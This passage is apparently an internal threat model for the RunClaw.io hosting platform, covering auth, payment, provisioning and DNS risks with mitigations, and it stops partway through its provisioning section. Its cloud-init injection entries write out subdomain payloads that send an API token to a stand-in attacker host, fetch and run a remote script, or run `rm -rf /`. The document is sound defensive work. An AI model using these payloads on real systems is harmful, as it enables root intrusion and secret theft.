# RunClaw.io -- Security Attack Surface Analysis

**Document Version:** 1.0
**Date:** 2026-02-03
**Classification:** Internal -- Security Sensitive
**Scope:** Full attack surface analysis of the RunClaw.io managed hosting platform for OpenClaw

---

## Table of Contents

- [Executive Summary](#executive-summary)
- [Architecture Overview](#architecture-overview)
- [Severity Rating System](#severity-rating-system)
- [1. Control Plane (Next.js on Vercel)](#1-control-plane-nextjs-on-vercel)
  - [1.1 API Route Authentication Bypass](#11-api-route-authentication-bypass)
  - [1.2 IDOR on Instance Management Endpoints](#12-idor-on-instance-management-endpoints)
  - [1.3 Server-Side Request Forgery via Cloud-Init Template Injection](#13-server-side-request-forgery-via-cloud-init-template-injection)
  - [1.4 Rate Limiting Absence on Create/Delete Endpoints](#14-rate-limiting-absence-on-createdelete-endpoints)
  - [1.5 Vercel Function Cold Start Timing Attacks](#15-vercel-function-cold-start-timing-attacks)
- [2. Authentication & Session Management (Appwrite)](#2-authentication--session-management-appwrite)
  - [2.1 Appwrite Session Cookie Security](#21-appwrite-session-cookie-security)
  - [2.2 Session Fixation Attacks](#22-session-fixation-attacks)
  - [2.3 Account Enumeration via Error Messages](#23-account-enumeration-via-error-messages)
  - [2.4 Password Reset Flow Weaknesses](#24-password-reset-flow-weaknesses)
  - [2.5 OAuth Redirect Manipulation](#25-oauth-redirect-manipulation)
- [3. Payment Flow (Stripe)](#3-payment-flow-stripe)
  - [3.1 Webhook Signature Bypass and Replay Attacks](#31-webhook-signature-bypass-and-replay-attacks)
  - [3.2 Race Condition: Instance Creation Before Payment Confirmation](#32-race-condition-instance-creation-before-payment-confirmation)
  - [3.3 Subscription Status Check Bypass](#33-subscription-status-check-bypass)
  - [3.4 Price Manipulation via Client-Side Plan Selection](#34-price-manipulation-via-client-side-plan-selection)
  - [3.5 Idempotency Key Collision Attacks](#35-idempotency-key-collision-attacks)
- [4. VPS Provisioning Pipeline](#4-vps-provisioning-pipeline)
  - [4.1 Cloud-Init Injection via Subdomain Field](#41-cloud-init-injection-via-subdomain-field)
  - [4.2 Callback Secret Brute Force or Prediction](#42-callback-secret-brute-force-or-prediction)
  - [4.3 Man-in-the-Middle on Callback URL](#43-man-in-the-middle-on-callback-url)
  - [4.4 TOCTOU on Subdomain Validation](#44-toctou-on-subdomain-validation)
  - [4.5 Hetzner API Token Exposure via Server-Side Logs](#45-hetzner-api-token-exposure-via-server-side-logs)
- [5. DNS & Network Layer (Cloudflare)](#5-dns--network-layer-cloudflare)
  - [5.1 Subdomain Takeover via Dangling DNS Records](#51-subdomain-takeover-via-dangling-dns-records)
  - [5.2 DNS Cache Poisoning](#52-dns-cache-poisoning)
  - [5.3 Cloudflare Proxy Bypass (Direct IP Access)](#53-cloudflare-proxy-bypass-direct-ip-access)
  - [5.4 SSL/TLS Downgrade Attacks](#54-ssltls-downgrade-attacks)
  - [5.5 Wildcard Certificate Risks](#55-wildcard-certificate-risks)
- [6. Customer VPS Instances](#6-customer-vps-instances)
  - [6.1 Container Escape from OpenClaw Docker Container](#61-container-escape-from-openclaw-docker-container)
  - [6.2 Caddy Misconfiguration](#62-caddy-misconfiguration)
  - [6.3 SSH Key Management Weaknesses](#63-ssh-key-management-weaknesses)
  - [6.4 Inter-Instance Network Isolation](#64-inter-instance-network-isolation)
  - [6.5 Health Check Endpoint Information Disclosure](#65-health-check-endpoint-information-disclosure)
  - [6.6 Resource Exhaustion](#66-resource-exhaustion)
- [7. Data Store (Appwrite)](#7-data-store-appwrite)
  - [7.1 Appwrite Permission Model Bypass](#71-appwrite-permission-model-bypass)
  - [7.2 Document-Level Permission Escalation](#72-document-level-permission-escalation)
  - [7.3 API Key Scope Over-Privilege](#73-api-key-scope-over-privilege)
  - [7.4 Backup and Export Data Exposure](#74-backup-and-export-data-exposure)
- [8. Supply Chain](#8-supply-chain)
  - [8.1 Docker Image Tampering](#81-docker-image-tampering)
  - [8.2 Cloud-Init Template Injection via Compromised Build](#82-cloud-init-template-injection-via-compromised-build)
  - [8.3 npm Dependency Poisoning](#83-npm-dependency-poisoning)
  - [8.4 Caddy Image Tampering](#84-caddy-image-tampering)
- [Summary Risk Matrix](#summary-risk-matrix)
- [Recommendations Priority](#recommendations-priority)

---

## Executive Summary

RunClaw.io is a managed hosting platform that automates the deployment and lifecycle management of OpenClaw personal AI agent instances. The platform spans multiple trust boundaries: a Next.js 14 control plane on Vercel, Appwrite Cloud for authentication and data storage, Stripe for payment processing, Hetzner Cloud for VPS provisioning, and Cloudflare for DNS and edge security.

This document identifies **32 distinct attack surface entries** across 8 categories. The analysis reveals that the most critical risks concentrate around:

1. **Cloud-init injection** -- user-controlled input flowing into shell commands during VPS provisioning
2. **IDOR vulnerabilities** -- insufficient authorization checks on instance management APIs
3. **Payment-provisioning race conditions** -- gaps between payment confirmation and resource creation
4. **Subdomain takeover** -- dangling DNS records after instance deletion
5. **Supply chain integrity** -- unverified Docker images pulled during provisioning

Each entry is rated using a CVSS-aligned severity scale and includes actionable mitigations.

---

## Architecture Overview

```
User Browser
    |
    v
[Vercel / Next.js 14 Control Plane]
    |         |          |
    v         v          v
[Appwrite]  [Stripe]  [Hetzner Cloud API]
 (Auth/DB)  (Payments)   |
                         v
                  [Cloud-Init Provisioning]
                         |
                         v
              [Customer VPS (Hetzner)]
              - OpenClaw (Docker)
              - Caddy (reverse proxy)
              - DNS via Cloudflare
```

**Trust Boundaries:**
- Browser to Vercel (TLS, session cookies)
- Vercel to Appwrite (API key, server SDK)
- Vercel to Stripe (webhook secret, API key)
- Vercel to Hetzner (API token)
- Vercel to Cloudflare (API token)
- Hetzner VPS to Control Plane (callback URL with secret)
- User to Customer VPS (subdomain via Cloudflare proxy)

---

## Severity Rating System

| Rating | CVSS Range | Description |
|--------|-----------|-------------|
| **Critical** | 9.0 -- 10.0 | Full system compromise, mass data breach, or arbitrary code execution on infrastructure |
| **High** | 7.0 -- 8.9 | Unauthorized access to other users' data, privilege escalation, or financial loss |
| **Medium** | 4.0 -- 6.9 | Limited information disclosure, denial of service, or bypass of non-critical controls |
| **Low** | 0.1 -- 3.9 | Minor information leakage, theoretical attacks requiring unlikely preconditions |

---

## 1. Control Plane (Next.js on Vercel)

The Next.js 14 application serves as the primary control plane. It handles user sessions, instance CRUD operations, and orchestrates provisioning across Hetzner, Cloudflare, and Stripe.

### 1.1 API Route Authentication Bypass

**Threat:** An attacker accesses protected API routes without valid authentication by exploiting missing or improperly implemented auth middleware in Next.js API route handlers.

**Severity:** Critical (CVSS ~9.1)
Next.js 14 App Router API routes do not have global middleware enforcement by default. Each route handler must explicitly verify the session. A single missing check exposes the entire operation (instance creation, deletion, configuration) to unauthenticated callers.

**Attack Vector:**
1. Attacker identifies API routes by inspecting client-side JavaScript bundles or network traffic (e.g., `/api/instances`, `/api/instances/[id]/delete`).
2. Attacker sends direct HTTP requests to these endpoints without session cookies.
3. If a route handler does not call `getSession()` or equivalent before processing, the request is processed as if authenticated.
4. Attacker can create, list, modify, or delete instances belonging to any user.

**Impact:**
- Unauthorized instance creation consuming Hetzner resources (financial impact to RunClaw.io).
- Deletion or modification of other users' instances.
- Exposure of instance configuration data including gateway tokens and connection details.

**Evidence in Spec:**
- Next.js 14 App Router does not enforce auth on API routes globally; each `route.ts` handler must implement its own auth check.
- The provisioning pipeline (Hetzner API calls, Cloudflare DNS creation) is triggered from these API routes.

**Mitigation:**
- Implement a centralized auth middleware wrapper that all API route handlers must use. Example pattern:
  ```typescript
  export function withAuth(handler: AuthenticatedHandler) {
    return async (req: NextRequest) => {
      const session = await getSession(req);
      if (!session) {
        return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
      }
      return handler(req, session);
    };
  }
  ```
- Add integration tests that call every API route without auth and assert 401 responses.
- Use Next.js middleware (`middleware.ts`) as a defense-in-depth layer to reject unauthenticated requests to `/api/*` paths before they reach route handlers.

---

### 1.2 IDOR on Instance Management Endpoints

**Threat:** An authenticated attacker accesses, modifies, or deletes another user's instance by manipulating the instance ID in API requests.

**Severity:** High (CVSS ~8.2)
Instance IDs are typically database document IDs (Appwrite document IDs are predictable or enumerable). Without ownership verification on every operation, any authenticated user can act on any instance.

**Attack Vector:**
1. Attacker authenticates with their own valid account.
2. Attacker calls `GET /api/instances/[victimInstanceId]` or `DELETE /api/instances/[victimInstanceId]`.
3. If the API route only checks that the caller is authenticated but does not verify `instance.userId === session.userId`, the operation succeeds.
4. Attacker enumerates instance IDs by incrementing or by observing patterns in Appwrite document IDs (which are ULIDs or similar).

**Impact:**
- Read access to victim's instance configuration (IP address, gateway token, subdomain).
- Ability to delete victim's VPS instance, causing denial of service.
- Ability to modify instance configuration, potentially redirecting DNS or injecting malicious configuration.

**Evidence in Spec:**
- Instance data stored in Appwrite with document-level permissions. If the API route uses a server-side API key (which bypasses Appwrite permissions), the ownership check must be done in application code.
- `/api/instances/*` routes accept instance ID as a path parameter.

**Mitigation:**
- Every instance operation must verify `instance.userId === authenticatedUser.id` before proceeding.
- Use Appwrite's document-level permissions (`read("user:<userId>")`) as a defense-in-depth layer, but do not rely on it exclusively since server-side API keys bypass these checks.
- Use non-sequential, high-entropy instance IDs (UUIDv4 or similar).
- Log and alert on repeated 403 responses from instance endpoints (indicates enumeration attempts).

---

### 1.3 Server-Side Request Forgery via Cloud-Init Template Injection

**Threat:** An attacker injects malicious URLs or commands into the cloud-init template by manipulating user-controlled fields (subdomain, instance name) that are interpolated into the cloud-init script.

**Severity:** Critical (CVSS ~9.8)
The cloud-init script is a shell script executed as root on the newly provisioned VPS. Any user input interpolated into this script without sanitization creates a command injection vulnerability.

**Attack Vector:**
1. Attacker creates an instance with a crafted subdomain value: `mysite; curl http://attacker.com/exfil?token=$(cat /etc/hetzner_api_token)`.
2. The control plane interpolates this value into the cloud-init template: `SUBDOMAIN="mysite; curl http://attacker.com/exfil?token=$(cat /etc/hetzner_api_token)"`.
3. The cloud-init script executes on the VPS, running the injected command as root.
4. The attacker receives exfiltrated secrets from the VPS.

**Impact:**
- Remote Code Execution as root on newly provisioned VPS.
- Exfiltration of provisioning secrets (callback URLs, API tokens).
- Lateral movement if the VPS has access to internal networks or the control plane callback.
- Potential SSRF from the VPS to internal Hetzner infrastructure.

**Evidence in Spec:**
- Cloud-init templates are generated server-side with user-provided subdomain values.
- The Hetzner API accepts `user_data` as a base64-encoded cloud-init script.
- The OpenClaw Hetzner deployment guide shows environment variables interpolated directly into shell scripts.

**Mitigation:**
- Validate subdomain values against a strict allowlist pattern: `/^[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?$/`.
- Never interpolate user input directly into shell scripts. Use environment variables passed via Hetzner metadata service or `write_files` directive instead of inline substitution.
- Use a templating engine with auto-escaping for cloud-init generation.
- Implement a cloud-init template review process: generate the template, validate it against a schema, then submit to Hetzner.

---

### 1.4 Rate Limiting Absence on Create/Delete Endpoints

**Threat:** An attacker floods instance creation or deletion endpoints, causing resource exhaustion on Hetzner (financial impact) or denial of service for legitimate users.

**Severity:** Medium (CVSS ~6.5)
Vercel serverless functions do not have built-in rate limiting. Without explicit rate limiting, an authenticated attacker can trigger hundreds of VPS provisioning requests.

**Attack Vector:**
1. Attacker creates a valid account (possibly with a stolen or disposable payment method).
2. Attacker scripts rapid calls to `POST /api/instances` in a loop.
3. Each call triggers Hetzner VPS creation ($5+/instance/month), Cloudflare DNS record creation, and cloud-init execution.
4. RunClaw.io incurs significant Hetzner charges before the attack is detected.
5. Alternatively, attacker rapidly deletes and recreates instances to cause DNS propagation chaos.

**Impact:**
- Financial loss from unauthorized Hetzner VPS provisioning.
- Hetzner API rate limit exhaustion, blocking legitimate provisioning.
- Cloudflare API rate limit exhaustion, blocking DNS operations for all users.
- Denial of service for the entire platform if shared API tokens are rate-limited upstream.

**Evidence in Spec:**
- Vercel functions are stateless; no built-in request rate tracking.
- Instance creation triggers multiple external API calls (Hetzner, Cloudflare, Stripe) with financial implications.

**Mitigation:**
- Implement per-user rate limiting: maximum 1 instance creation per 5 minutes, maximum 3 active instances per account.
- Use Vercel Edge Middleware or an external rate limiter (Upstash Redis) to enforce limits before the function executes.
- Implement a provisioning queue (not direct API calls) so requests can be throttled and deduplicated.
- Add Hetzner spending alerts and API call monitoring.
- Require payment confirmation before triggering any Hetzner API call.

---

### 1.5 Vercel Function Cold Start Timing Attacks

**Threat:** An attacker exploits timing differences in Vercel serverless function cold starts to infer information about authentication state, database query results, or branching logic.

**Severity:** Low (CVSS ~3.1)
Cold starts introduce variable latency (50-500ms overhead), which can make timing-based information disclosure slightly easier. However, Vercel's shared infrastructure adds enough noise that practical exploitation is difficult.

**Attack Vector:**
1. Attacker measures response times for authenticated vs. unauthenticated requests.
2. Cold start timing may reveal whether a session lookup succeeded (cache hit vs. miss), whether an instance ID exists (fast 404 vs. slow database query), or which code path was taken.
3. Repeated measurements can statistically distinguish valid from invalid instance IDs or session tokens.

**Impact:**
- Minor information disclosure (instance existence, session validity).
- Could aid in IDOR enumeration (Section 1.2) by distinguishing valid from invalid instance IDs more quickly.

**Evidence in Spec:**
- Vercel serverless functions have documented cold start behavior.
- Database queries to Appwrite Cloud introduce variable latency depending on query complexity.

**Mitigation:**
- Add constant-time comparison for session tokens and instance lookups where possible.
- Introduce artificial jitter (random delay of 10-50ms) on sensitive endpoints to mask timing differences.
- This is a defense-in-depth concern; prioritize the higher-severity items first.

---

## 2. Authentication & Session Management (Appwrite)

Appwrite Cloud handles user authentication, session management, and serves as the primary data store. The security of the entire platform depends on the integrity of Appwrite sessions.

### 2.1 Appwrite Session Cookie Security

**Threat:** An attacker steals or manipulates Appwrite session cookies due to misconfigured cookie attributes.

**Severity:** High (CVSS ~7.5)
If session cookies lack `Secure`, `HttpOnly`, or `SameSite` attributes, they become vulnerable to interception (network sniffing), client-side theft (XSS), or cross-site submission (CSRF).

**Attack Vector:**
1. If `HttpOnly` is missing: attacker exploits an XSS vulnerability in the Next.js frontend to read `document.cookie` and exfiltrate the Appwrite session cookie.
2. If `Secure` is missing: attacker on the same network intercepts the cookie over an HTTP connection.
3. If `SameSite=None` without justification: attacker embeds a cross-origin request from a malicious page that automatically includes the victim's session cookie.

**Impact:**
- Full account takeover: the attacker can impersonate the victim, access their instances, modify configurations, or delete resources.
- If the victim is an admin, the attacker gains administrative access to the platform.

**Evidence in Spec:**
- Appwrite Cloud manages session cookies. The Next.js app passes these cookies through via server-side rendering or API proxy routes.
- Cookie attributes depend on the Appwrite project configuration and how the Next.js app proxies auth.

**Mitigation:**
- Verify Appwrite session cookies are set with `Secure; HttpOnly; SameSite=Strict` (or `SameSite=Lax` if cross-origin flows require it).
- If the Next.js app proxies Appwrite cookies, ensure the proxy preserves these attributes.
- Implement Content Security Policy (CSP) headers to reduce XSS risk.
- Enable Appwrite's session limits (maximum sessions per user, session duration).

---

### 2.2 Session Fixation Attacks

**Threat:** An attacker pre-sets a session identifier and tricks a victim into authenticating with it, granting the attacker access to the authenticated session.

**Severity:** Medium (CVSS ~5.9)
Session fixation is possible if the application does not regenerate session IDs upon successful authentication.

**Attack Vector:**
1. Attacker obtains a valid unauthenticated session ID from Appwrite (by visiting the site).
2. Attacker crafts a URL or injects the session cookie into the victim's browser (via XSS, subdomain cookie injection, or social engineering).
3. Victim logs in, and the session ID remains the same.
4. Attacker uses the known session ID to access the victim's authenticated session.

**Impact:**
- Account takeover for the duration of the fixed session.
- Access to victim's instances and configuration data.

**Evidence in Spec:**
- Appwrite's session management is handled by the Appwrite SDK. Session regeneration behavior depends on the SDK version and configuration.

**Mitigation:**
- Verify that Appwrite regenerates session IDs upon successful login (this is default behavior in recent Appwrite versions; confirm with the version in use).
- Invalidate any pre-existing session tokens upon login.
- Bind sessions to additional context (user agent, IP prefix) as a defense-in-depth measure.

---

### 2.3 Account Enumeration via Error Messages

**Threat:** An attacker determines whether a specific email address is registered on RunClaw.io by observing differences in error responses during signup, login, or password reset.

**Severity:** Medium (CVSS ~5.3)
Differential error messages ("email already registered" vs. "invalid credentials") allow attackers to build a list of valid accounts for targeted phishing or credential stuffing.

**Attack Vector:**
1. Attacker submits signup requests with target email addresses.
2. If the response is "email already in use," the attacker confirms the email is registered.
3. Alternatively, the attacker submits login attempts and observes whether the error is "user not found" vs. "incorrect password."
4. The attacker compiles a list of valid accounts and launches targeted attacks (phishing, credential stuffing from breached databases).

**Impact:**
- Privacy violation: disclosure of email-to-platform association.
- Enables targeted phishing campaigns against confirmed users.
- Enables credential stuffing attacks against known-valid accounts.

**Evidence in Spec:**
- Appwrite returns specific error codes that distinguish between "user not found" and "invalid password" by default.
- The Next.js frontend may pass these error messages directly to the client.

**Mitigation:**
- Return generic error messages: "Invalid email or password" for login, "If this email is registered, you will receive a reset link" for password reset.
- On signup, use a consistent response: "Check your email to verify your account" regardless of whether the email is already registered.
- Implement rate limiting on auth endpoints (login, signup, password reset) to slow enumeration.

---

### 2.4 Password Reset Flow Weaknesses

**Threat:** An attacker exploits weaknesses in the password reset flow to take over another user's account.

**Severity:** High (CVSS ~7.4)
Password reset flows are a common source of account takeover vulnerabilities, especially if reset tokens are weak, reusable, or long-lived.

**Attack Vector:**
1. **Token brute force:** If Appwrite generates short or predictable reset tokens, the attacker guesses valid tokens.
2. **Token reuse:** If reset tokens are not invalidated after use, an attacker who intercepts a used token can replay it.
3. **Host header injection:** Attacker manipulates the `Host` header in the reset request so the reset link points to an attacker-controlled domain, capturing the token when the victim clicks the link.
4. **Reset token in referrer:** If the reset page loads external resources, the reset token in the URL may leak via the `Referer` header.

**Impact:**
- Full account takeover.
- Access to all instances, billing data, and configuration.

**Evidence in Spec:**
- Password reset is handled by Appwrite's built-in flow, which sends a reset link via email.
- The Next.js app provides the reset page URL to Appwrite, which is interpolated into the email.

**Mitigation:**
- Verify Appwrite's reset token entropy is sufficient (minimum 128 bits of randomness).
- Ensure reset tokens are single-use and expire within 1 hour.
- Validate the `Host` header on reset requests; reject requests with unexpected hosts.
- Set `Referrer-Policy: no-referrer` on the password reset page.
- Rate limit password reset requests per email and per IP.

---

### 2.5 OAuth Redirect Manipulation

**Threat:** An attacker manipulates OAuth redirect URIs to intercept authorization codes or tokens, gaining access to the victim's account.

**Severity:** High (CVSS ~7.6)
If OAuth is enabled (Google, GitHub login), the redirect URI validation is critical. Open redirects or lax URI matching allow code/token interception.

**Attack Vector:**
1. Attacker identifies the OAuth callback URL pattern (e.g., `https://runclaw.io/auth/callback`).
2. Attacker crafts a modified authorization request with a redirect URI pointing to their domain: `https://runclaw.io.attacker.com/auth/callback` or `https://runclaw.io/auth/callback/../../../attacker.com`.
3. If the OAuth provider or Appwrite performs lax redirect URI validation (prefix match, open redirect chain), the authorization code is sent to the attacker's domain.
4. Attacker exchanges the code for an access token and creates a session.

**Impact:**
- Account takeover via OAuth flow hijacking.
- Access to linked OAuth provider data (email, profile).

**Evidence in Spec:**
- Appwrite supports OAuth providers with configurable redirect URIs.
- The redirect URI is typically set in both the OAuth provider console and the Appwrite project settings.

**Mitigation:**
- Register exact redirect URIs in both the OAuth provider console and Appwrite (no wildcards, no prefix matching).
- Validate the `state` parameter to prevent CSRF on the OAuth callback.
- Use PKCE (Proof Key for Code Exchange) for all OAuth flows.
- Audit the list of registered redirect URIs quarterly.

---

## 3. Payment Flow (Stripe)

Stripe handles subscription management and payment processing. The integration between Stripe webhooks and instance provisioning is a critical trust boundary.

### 3.1 Webhook Signature Bypass and Replay Attacks

**Threat:** An attacker sends forged Stripe webhook events to the control plane, triggering unauthorized instance provisioning, or replays legitimate webhook events to duplicate actions.

**Severity:** Critical (CVSS ~9.0)
Stripe webhooks drive the provisioning pipeline. If webhook signature verification is missing or bypassable, an attacker can trigger arbitrary provisioning actions.

**Attack Vector:**
1. **Signature bypass:** Attacker sends a crafted POST request to the webhook endpoint (`/api/webhooks/stripe`) with a fake `checkout.session.completed` event. If the handler does not verify the `Stripe-Signature` header, the event is processed.
2. **Replay attack:** Attacker intercepts a legitimate webhook delivery (via compromised logs or network position) and replays it. Without idempotency tracking, the action is executed again (e.g., creating a duplicate instance).
3. **Timing-based bypass:** Attacker exploits the tolerance window in Stripe's signature verification (default 300 seconds) to replay events within the window.

**Impact:**
- Unauthorized instance creation (financial loss to RunClaw.io).
- Duplicate instance provisioning from replayed events.
- Manipulation of subscription state (faking cancellations, upgrades).

**Evidence in Spec:**
- The `/api/webhooks/stripe` endpoint receives Stripe events and triggers Hetzner provisioning.
- Stripe provides the `stripe.webhooks.constructEvent()` function for signature verification, but it must be explicitly called.

**Mitigation:**
- Always verify webhook signatures using `stripe.webhooks.constructEvent(body, sig, secret)` with the raw request body.
- Implement idempotency: track processed event IDs in Appwrite and reject duplicates.
- Reduce the timestamp tolerance to 60 seconds (Stripe SDK supports custom tolerance).
- Restrict the webhook endpoint to Stripe's documented IP ranges as a defense-in-depth layer.
- Log all webhook events (including rejected ones) for audit trail.

---

### 3.2 Race Condition: Instance Creation Before Payment Confirmation

**Threat:** An attacker exploits the asynchronous nature of payment processing to provision an instance before payment is fully confirmed.

**Severity:** High (CVSS ~7.8)
If instance provisioning is triggered immediately upon Stripe checkout session creation (rather than upon confirmed payment), an attacker can use a payment method that will ultimately fail (insufficient funds, stolen card) to get a provisioned instance.

**Attack Vector:**
1. Attacker initiates a Stripe checkout session with a card that will be declined after initial authorization.
2. The control plane receives `checkout.session.completed` (which indicates the session completed, not necessarily that the charge succeeded for subscription).
3. The control plane immediately triggers Hetzner VPS provisioning.
4. The actual charge fails hours later (e.g., 3D Secure timeout, bank decline on capture).
5. The attacker has a running VPS instance without having paid.

**Impact:**
- Financial loss from unpaid VPS instances running on Hetzner.
- Free compute for the attacker until detection and cleanup.
- Potential abuse of the VPS for malicious activities (mining, scanning, spam).

**Evidence in Spec:**
- The provisioning flow is triggered by Stripe webhook events.
- The time between checkout completion and first successful charge can vary for subscriptions.

**Mitigation:**
- Only provision on `invoice.payment_succeeded` for the first invoice, not on `checkout.session.completed`.
- For subscriptions, provision only after the first invoice is confirmed paid.
- Implement a grace period: provision the VPS but keep it in a "pending" state until payment is confirmed. Destroy if not confirmed within 30 minutes.
- Monitor for accounts with high provisioning-to-payment failure ratios.

---

### 3.3 Subscription Status Check Bypass

**Threat:** An attacker maintains access to a provisioned VPS instance after their subscription has been cancelled or payment has failed.

**Severity:** Medium (CVSS ~6.2)
If the control plane does not actively reconcile subscription status with running instances, cancelled or delinquent subscriptions continue to consume resources.

**Attack Vector:**
1. Attacker subscribes and gets an instance provisioned.
2. Attacker cancels the subscription or triggers a payment failure (e.g., removes the payment method).
3. The control plane does not receive or process the `customer.subscription.deleted` or `invoice.payment_failed` webhook.
4. The VPS continues running indefinitely, consuming Hetzner resources without payment.

**Impact:**
- Revenue loss from running unpaid instances.
- Resource exhaustion if many users exploit this.

**Evidence in Spec:**
- Instance lifecycle is tied to Stripe subscription status.
- Webhook delivery can fail (Stripe retries, but eventual consistency gaps exist).

**Mitigation:**
- Implement a periodic reconciliation job (every hour) that compares active Hetzner instances against active Stripe subscriptions and flags mismatches.
- Handle `customer.subscription.deleted`, `customer.subscription.updated`, and `invoice.payment_failed` webhooks to trigger instance suspension/deletion.
- Implement a grace period (e.g., 3 days) for failed payments before deletion, with user notification.
- Use Stripe's subscription status API as the source of truth, not just webhooks.

---

### 3.4 Price Manipulation via Client-Side Plan Selection

**Threat:** An attacker manipulates the plan ID or price amount sent from the client to the server when creating a Stripe checkout session, obtaining a premium plan at a lower price.

**Severity:** High (CVSS ~7.1)
If the server trusts client-provided plan/price identifiers without validation, an attacker can substitute a cheaper plan ID or a lower price.

**Attack Vector:**
1. Attacker inspects the checkout flow and identifies the plan ID sent to the server (e.g., `price_abc123` for the $20/month plan).
2. Attacker replaces it with a cheaper plan ID (`price_xyz789` for $5/month) or a test/free plan ID.
3. The server creates a Stripe checkout session with the attacker-supplied price ID.
4. Attacker completes checkout at the lower price but receives the premium instance configuration.

**Impact:**
- Revenue loss from discounted subscriptions.
- If test or zero-dollar price IDs exist, the attacker gets free instances.

**Evidence in Spec:**
- The Next.js frontend sends a plan selection to the API route that creates the Stripe checkout session.
- The server uses this plan ID to call `stripe.checkout.sessions.create({ line_items: [{ price: planId }] })`.

**Mitigation:**
- Never trust client-provided price IDs. Maintain a server-side allowlist of valid price IDs mapped to plan tiers.
- Validate the plan ID against the allowlist before creating the checkout session.
- After checkout completion, verify the actual price paid matches the expected amount for the provisioned tier.
- Use Stripe's `metadata` to associate the correct plan tier and validate on webhook receipt.

---

### 3.5 Idempotency Key Collision Attacks

**Threat:** An attacker crafts idempotency keys to collide with legitimate operations, causing Stripe to return cached responses for different requests.

**Severity:** Low (CVSS ~3.5)
Stripe idempotency keys are optional but recommended. If the key generation is predictable (e.g., based on user ID + timestamp), an attacker can precompute keys and poison the cache.

**Attack Vector:**
1. Attacker identifies the idempotency key generation pattern (e.g., `${userId}-${timestamp}`).
2. Attacker sends a request with a predicted key and a modified payload (different plan, different amount) before the legitimate request arrives.
3. When the legitimate request arrives with the same key, Stripe returns the cached response from the attacker's request.

**Impact:**
- Disruption of legitimate operations (wrong plan provisioned, wrong amount charged).
- Requires knowledge of the key generation pattern, making practical exploitation unlikely.

**Evidence in Spec:**
- Stripe idempotency keys are typically generated server-side for mutation operations.

**Mitigation:**
- Generate idempotency keys using cryptographically random values (UUIDv4), not derived from predictable inputs.
- Include a server-side secret or HMAC in the key derivation if deterministic keys are needed.
- This is a low-priority concern; focus on other Stripe mitigations first.

---

## 4. VPS Provisioning Pipeline

The provisioning pipeline is the most security-sensitive component because it bridges user input to root-level execution on newly created VPS instances.

### 4.1 Cloud-Init Injection via Subdomain Field

**Threat:** An attacker injects shell commands through the subdomain field, which is interpolated into the cloud-init script executed as root on the provisioned VPS.

**Severity:** Critical (CVSS ~9.8)
This is the single highest-risk vulnerability in the architecture. User-provided subdomain values flow into a shell script executed as root.

**Attack Vector:**
1. Attacker registers and subscribes normally.
2. When prompted for a subdomain, attacker enters: `test$(curl attacker.com/shell.sh|bash)` or `test"; rm -rf / #`.
3. The control plane interpolates the subdomain into the cloud-init template:
   ```bash
   SUBDOMAIN="test$(curl attacker.com/shell.sh|bash)"
   ```
4. Cloud-init executes the script as root on the new VPS.
5. The injected command runs with full root privileges.
6. Attacker achieves RCE on the VPS and can pivot to exfiltrate the callback secret, Hetzner metadata, or other provisioning artifacts.

**Impact:**
- Root-level Remote Code Execution on provisioned VPS.
- Exfiltration of all secrets embedded in cloud-init (callback URLs, tokens).
- Potential lateral movement to other systems if the VPS has network access to the control plane.
- Attacker could modify the VPS to serve as a persistent backdoor or attack relay.

**Evidence in Spec:**
- Cloud-init templates interpolate user-provided subdomain values into shell scripts.
- The Hetzner API `user_data` parameter accepts arbitrary cloud-init scripts.
- The OpenClaw Hetzner guide shows direct variable interpolation in shell contexts.

**Mitigation:**
- **Input validation (primary):** Validate subdomain against `^[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?$` -- reject anything that does not match. This validation must happen server-side; never trust client-side validation alone.
- **Template safety (secondary):** Use `write_files` and `runcmd` cloud-init modules instead of inline shell scripts. Pass user values as cloud-init `write_files` content, then reference them in `runcmd` as file contents (not shell variables).
- **Parameterized provisioning:** Do not embed user input in shell scripts at all. Write configuration to a JSON/YAML file via `write_files`, then have a static boot script read from that file.
- **Validation test suite:** Create a comprehensive test suite with injection payloads to verify sanitization.

---

### 4.2 Callback Secret Brute Force or Prediction

**Threat:** An attacker guesses or brute-forces the callback secret used by the provisioned VPS to report its status to the control plane.

**Severity:** High (CVSS ~7.3)
After cloud-init completes, the VPS calls back to the control plane with a secret to confirm successful provisioning. If this secret is predictable, an attacker can impersonate a VPS.

**Attack Vector:**
1. Attacker determines the callback URL pattern (e.g., `https://runclaw.io/api/callbacks/provision?secret=<token>&instanceId=<id>`).
2. If the secret is generated with insufficient entropy (e.g., short UUID, sequential, timestamp-based), the attacker brute-forces or predicts it.
3. Attacker sends a spoofed callback to the control plane, marking an instance as "provisioned" before it actually is, or marking a victim's instance as "failed."
4. This could cause the control plane to route traffic to a non-existent or attacker-controlled IP.

**Impact:**
- Spoofed provisioning status, causing DNS records to point to wrong IPs.
- Denial of service for legitimate users if their instances are marked as failed.
- If the callback also reports the VPS IP, the attacker can inject their own IP, hijacking the user's subdomain.

**Evidence in Spec:**
- Cloud-init scripts include a callback URL with a secret token.
- The control plane updates instance status based on callback receipt.

**Mitigation:**
- Generate callback secrets with 256 bits of entropy using `crypto.randomBytes(32).toString('hex')`.
- Callback secrets must be single-use: once a callback is received and processed, reject subsequent callbacks with the same secret.
- Bind the callback to the expected source IP (the Hetzner VPS IP allocated during provisioning).
- Set a short TTL on callback validity (e.g., 30 minutes from provisioning start).
- Rate limit the callback endpoint: maximum 3 attempts per instance ID.

---

### 4.3 Man-in-the-Middle on Callback URL

**Threat:** An attacker intercepts the callback from the provisioned VPS to the control plane, capturing the callback secret or modifying the callback payload.

**Severity:** Medium (CVSS ~5.7)
If the callback URL uses HTTP instead of HTTPS, or if TLS certificate validation is disabled in the cloud-init script, the callback is vulnerable to interception.

**Attack Vector:**
1. The cloud-init script includes `curl http://runclaw.io/api/callbacks/provision?secret=abc123` (HTTP, not HTTPS).
2. An attacker with a network position between the VPS and the control plane (e.g., on the Hetzner network, ISP, or via BGP hijacking) intercepts the callback.
3. The attacker captures the callback secret and can replay it or modify the payload.
4. Alternatively, the attacker blocks the callback, causing the instance to appear as failed.

**Impact:**
- Callback secret theft, enabling spoofed callbacks.
- Instance provisioning disruption.
- Information disclosure (instance IDs, secrets in URL parameters).

**Evidence in Spec:**
- The callback URL is embedded in the cloud-init script and called via `curl` or `wget` from the VPS.
- URL construction depends on how the control plane generates the callback.

**Mitigation:**
- Always use HTTPS for callback URLs. Enforce this in the cloud-init template generation code.
